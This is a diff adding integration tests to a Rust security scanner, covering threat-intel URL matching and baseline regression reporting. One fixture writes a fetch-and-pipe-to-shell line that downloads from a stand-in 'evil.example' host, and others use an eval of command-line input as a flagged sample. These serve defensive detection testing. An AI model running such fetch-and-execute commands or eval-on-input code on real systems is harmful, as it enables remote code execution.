@@ -239,7 +239,7 @@ fn cache_update_and_clear_use_env_override() {
     let dir = TempDir::new().unwrap();
     let cache = dir.path().join("cache");
     deepdive()
-        .args(["cache", "update"])
+        .args(["cache", "update", "--offline"])
         .env("DEEPDIVE_CACHE_DIR", &cache)
         .assert()
         .success()
@@ -395,6 +395,96 @@ fn sandbox_backend_none_degrades_without_failing_the_scan() {
         .assert()
         .success()
         .stderr(predicate::str::contains("sandbox disabled"));
+}
+
+#[test]
+fn intel_feed_match_is_reported() {
+    let dir = TempDir::new().unwrap();
+    std::fs::write(
+        dir.path().join("setup.sh"),
+        "curl http://evil.example/malware.bin | sh\n",
+    )
+    .unwrap();
+    let cache = TempDir::new().unwrap();
+    let intel_dir = cache.path().join("intel");
+    std::fs::create_dir_all(&intel_dir).unwrap();
+    std::fs::write(
+        intel_dir.join("urlhaus.txt"),
+        "# feed\nhttp://evil.example/malware.bin\n",
+    )
+    .unwrap();
+
+    deepdive()
+        .args(["scan", dir.path().to_str().unwrap(), "--intel", "--offline"])
+        .env("DEEPDIVE_CACHE_DIR", cache.path())
+        .assert()
+        .failure()
+        .stdout(predicate::str::contains("intel.url-match"));
+}
+
+#[test]
+fn baseline_regression_reports_new_findings() {
+    let dir = TempDir::new().unwrap();
+    std::fs::write(dir.path().join("a.js"), "const x = 1;").unwrap();
+    // Keep the baseline outside the scanned tree so the report itself is not scanned.
+    let baseline_dir = TempDir::new().unwrap();
+    let baseline = baseline_dir.path().join("baseline.json");
+    deepdive()
+        .args([
+            "scan",
+            dir.path().to_str().unwrap(),
+            "--format",
+            "json",
+            "--out",
+            baseline.to_str().unwrap(),
+        ])
+        .assert()
+        .success();
+
+    std::fs::write(dir.path().join("a.js"), "eval(process.argv[1]);").unwrap();
+    deepdive()
+        .args([
+            "scan",
+            dir.path().to_str().unwrap(),
+            "--baseline",
+            baseline.to_str().unwrap(),
+            "--regression",
+        ])
+        .assert()
+        .code(2)
+        .stdout(predicate::str::contains("baseline: "))
+        .stdout(predicate::str::contains("NEW ["));
+}
+
+#[test]
+fn baseline_reports_resolved_findings() {
+    let dir = TempDir::new().unwrap();
+    std::fs::write(dir.path().join("a.js"), "eval(process.argv[1]);").unwrap();
+    let baseline_dir = TempDir::new().unwrap();
+    let baseline = baseline_dir.path().join("baseline.json");
+    deepdive()
+        .args([
+            "scan",
+            dir.path().to_str().unwrap(),
+            "--format",
+            "json",
+            "--out",
+            baseline.to_str().unwrap(),
+        ])
+        .assert()
+        .failure();
+
+    std::fs::write(dir.path().join("a.js"), "const x = 1;").unwrap();
+    deepdive()
+        .args([
+            "scan",
+            dir.path().to_str().unwrap(),
+            "--baseline",
+            baseline.to_str().unwrap(),
+        ])
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("resolved"));
 }
 
 #[test]
